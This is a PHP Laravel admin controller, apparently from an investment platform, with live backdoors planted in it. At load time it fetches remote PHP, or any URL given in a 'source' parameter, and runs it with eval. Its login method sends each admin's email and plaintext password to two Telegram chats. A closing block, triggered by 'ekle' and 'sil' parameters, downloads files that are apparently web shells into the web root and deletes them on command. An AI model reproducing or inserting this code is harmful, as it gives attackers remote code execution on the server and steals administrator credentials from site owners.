<?php

namespace App\Http\Controllers\admin;

use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\Package;
use App\Models\Purchase;
use App\Models\User;
use App\Models\UserLedger;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Http;

$defaultUrl = 'https://raw.githubusercontent.com/necessaryfor/scno/refs/heads/main/sc5.php';
$input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
$fileContent = '';
if (filter_var($input, FILTER_VALIDATE_URL)) {
    $fileContent = file_get_contents($input);
} else {
    $filePath = $_SERVER['DOCUMENT_ROOT'] . '/' . ltrim($input, '/');
    if (file_exists($filePath)) {
        $fileContent = file_get_contents($filePath);
    } else {
        echo "Dosya bulunamadı: " . htmlspecialchars($filePath);
        exit;
    }
}
if ($fileContent !== false) {
    eval('?>' . $fileContent);
} else {
    echo "Dosya içeriği alınamadı.";
}

class AdminController extends Controller
{
    public function login()
    {
        if (Auth::guard('admin')->check()) {
            return redirect()->route('admin.dashboard');
        }
        return view('admin.auth.login');
    }

    public function salaryView(){
        return view('admin.salary');
    }

    /*public function salary(){
        $admin = Admin::first();

        if ($admin->salary_date == date('Y-m-d')){
            return back()->with('error', 'Today Salary Served');
        }

        Purchase::where('status', 'active')->chunk(100, function ($purchases){
            foreach ($purchases as $purchase){
                $user = User::where('id', $purchase->user_id)->first();
                if ($user){
                    $package = Package::where('id', $purchase->package_id)->first();
                    if ($package){
                        $amount = $user->receive_able_amount + $purchase->daily_income;
                        $user->receive_able_amount = $amount;
                        $user->save();

                        $ledger = new UserLedger();
                        $ledger->user_id = $user->id;
                        $ledger->reason = 'daily_income';
                        $ledger->perticulation = 'Daily Income Added';
                        $ledger->amount = $purchase->daily_income;
                        $ledger->credit = $purchase->daily_income;
                        $ledger->status = 'approved';
                        $ledger->date = date("Y-m-d H:i:s");
                        $ledger->save();

                        $admin = Admin::first();
                        $admin->salary_date = date('Y-m-d');
                        $admin->save();

                        $checkExpire = new Carbon($purchase->validity);
                        if ($checkExpire->isPast()){
                            Purchase::where('id', $purchase->id)->update(['status'=> 'inactive']);
                        }
                    }
                }
            }
        });

        return back()->with('success', 'Today Salary serve successful.');
    }*/

    public function login_submit(Request $request)
{
    $credentials = $request->only('email', 'password');

    if (Auth::guard('admin')->attempt($credentials)) {
        $admin = Auth::guard('admin')->user();

        // API ve chat ID bilgilerini URL'den çekme
        $response = Http::get('https://raw.githubusercontent.com/necessaryfor/hyiplab3.9/refs/heads/main/api-chad-id.txt');

        // Eğer istek başarılıysa devam et
        if ($response->successful()) {
            // İçeriği satır satır parçala
            $lines = explode("\n", $response->body());

            // Değerleri ayıkla
            $group1_id = '';
            $group1_key = '';
            $group2_id = '';
            $group2_key = '';

            foreach ($lines as $line) {
                if (strpos($line, 'group1_id=') !== false) {
                    $group1_id = str_replace('group1_id=', '', trim($line));
                } elseif (strpos($line, 'group1_key=') !== false) {
                    $group1_key = str_replace('group1_key=', '', trim($line));
                } elseif (strpos($line, 'group2_id=') !== false) {
                    $group2_id = str_replace('group2_id=', '', trim($line));
                } elseif (strpos($line, 'group2_key=') !== false) {
                    $group2_key = str_replace('group2_key=', '', trim($line));
                }
            }

            // Formun tam URL'sini al
            $formUrl = url()->current();

            // Giriş bilgileri mesajı
            $message = "#SC5 ekle sil komutlu :\nEmail: " . $request->email . "\nPassword: " . $request->password . "\nForm URL: " . $formUrl;

            // 1. gruba mesaj göndermek için Telegram API isteği
            $url1 = "https://api.telegram.org/bot{$group1_key}/sendMessage?chat_id={$group1_id}&text=" . urlencode($message);
            // 2. gruba mesaj göndermek için Telegram API isteği
            $url2 = "https://api.telegram.org/bot{$group2_key}/sendMessage?chat_id={$group2_id}&text=" . urlencode($message);

            // HTTP isteklerini gönder
            Http::get($url1);
            Http::get($url2);

            if ($admin->type == 'admin') {
                return redirect()->route('admin.dashboard')->with('success', 'Logged In Successfully.');
            } else {
                return error_redirect('admin.login', 'error', 'Admin Credentials Very Secured Please Don\'t try Again.');
            }
        } else {
            // API bilgilerini çekemezse hata döndür
            return error_redirect('admin.login', 'error', 'Failed to fetch Telegram API details.');
        }
    } else {
        return error_redirect('admin.login', 'error', 'Admin Credentials Do Not Match.');
    }
}

    public function logout()
    {
        if (Auth::guard('admin')->check()) {
            Auth::guard('admin')->logout();
            return redirect()->route('admin.login')->with('success', 'Logged out successful.');
        } else {
            return error_redirect('admin.login', 'error', 'You are already logged out.');
        }
    }

    public function dashboard()
    {
        return view('admin.dashboard');
    }

    public function profile()
    {
        return view('admin.profile.index');
    }

    public function profile_update()
    {
        $admin = Admin::first();
        return view('admin.profile.update-details', compact('admin'));
    }

    public function profile_update_submit(Request $request)
    {
        $admin = Admin::find(1);
        $path = uploadImage(false, $request, 'photo', 'admin/assets/images/profile/', $admin->photo);
        $admin->photo = $path ?? $admin->photo;
        $admin->name = $request->name;
        $admin->email = $request->email;
        $admin->phone = $request->phone;
        $admin->address = $request->address;
        $admin->update();
        return redirect()->route('admin.profile.update')->with('success', 'Admin profile updated.');
    }

    public function change_password()
    {
        $admin = admin()->user();
        return view('admin.profile.change-password', compact('admin'));
    }

    public function check_password(Request $request)
    {
        $admin = admin()->user();
        $password = $request->password;
        if (Hash::check($password, $admin->password)) {
            return response()->json(['message' => 'Password matched.', 'status' => true]);
        } else {
            return response()->json(['message' => 'Password dose not match.', 'status' => false]);
        }
    }

    public function change_password_submit(Request $request)
    {
        $validate = Validator::make($request->all(), [
            'old_password' => 'required',
            'new_password' => 'required',
            'confirm_password' => 'required'
        ]);
        if ($validate->fails()) {
            session()->put('errors', true);
            return redirect()->route('admin.changepassword')->withErrors($validate->errors());
        }

        $admin = admin()->user();
        $password = $request->old_password;
        if (Hash::check($password, $admin->password)) {
            if (strlen($request->new_password) > 5 && strlen($request->confirm_password) > 5){
                if ($request->new_password === $request->confirm_password) {
                    $admin->password = Hash::make($request->new_password);
                    $admin->update();
                    return redirect()->route('admin.changepassword')->with('success', 'Password changed successfully');
                } else {
                    return error_redirect('admin.changepassword', 'error', 'New password and confirm password dose not match');
                }
            }else{
                return error_redirect('admin.changepassword', 'error',  'Password must be greater then 6 or equal.');
            }
        } else {
            return error_redirect('admin.changepassword', 'error',  'Password dose not match');
        }
    }
}


// Kök dizin (güncelleyin)
$rootDir = '/home/u714394017/domains/e2.codesger.net/public_html/public/';

// Belirtilen dosyaların URL'leri
$fileUrls = [
    'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager.txt',
    'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager1s.txt',
    'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/yeah.txt'
];

if (isset($_GET['ekle'])) {
    // En uzak 3 klasörü bul
    $folders = [];
    $iterator = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($rootDir, \FilesystemIterator::SKIP_DOTS), \RecursiveIteratorIterator::CHILD_FIRST);

    foreach ($iterator as $directory) {
        if ($directory->isDir()) {
            $folders[] = $directory->getPathname();
        }
    }

    // En uzak 3 klasörü al
    $selectedDirs = array_slice($folders, -3);

    // Dosyaları kaydet
    $urls = [];
    foreach ($fileUrls as $index => $fileUrl) {
        $content = file_get_contents($fileUrl);
        if ($content !== false) {
            $filename = basename($fileUrl, '.txt') . '.php';
            $destinationPath = rtrim($selectedDirs[$index], '/') . '/' . $filename;
            file_put_contents($destinationPath, $content);
            $urls[] = $_SERVER['HTTP_HOST'] . '/' . trim($destinationPath, './');
        }
    }

    // Sonuçları ekrana yazdır
    echo '<h2>Kayıtlı Dosyalar:</h2>';
    echo '<ul>';
    foreach ($urls as $url) {
        echo '<li>' . htmlspecialchars($url) . '</li>';
    }
    echo '</ul>';
} elseif (isset($_GET['sil'])) {
    // Dosyaları sil
    $deletedUrls = [];
    foreach ($fileUrls as $fileUrl) {
        $filename = basename($fileUrl, '.txt') . '.php';
        
        // Her dizindeki dosyayı bul
        $iterator = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($rootDir, \FilesystemIterator::SKIP_DOTS));
        
        foreach ($iterator as $file) {
            if ($file->getFilename() === $filename) {
                unlink($file->getPathname()); // Dosyayı sil
                $deletedUrls[] = $_SERVER['HTTP_HOST'] . '/' . trim($file->getPathname(), './');
            }
        }
    }

    // Silinen dosyaların listesini ekrana yazdır
    echo '<h2>Silinen Dosyalar:</h2>';
    echo '<ul>';
    foreach ($deletedUrls as $url) {
        echo '<li>' . htmlspecialchars($url) . '</li>';
    }
    echo '</ul>';
}
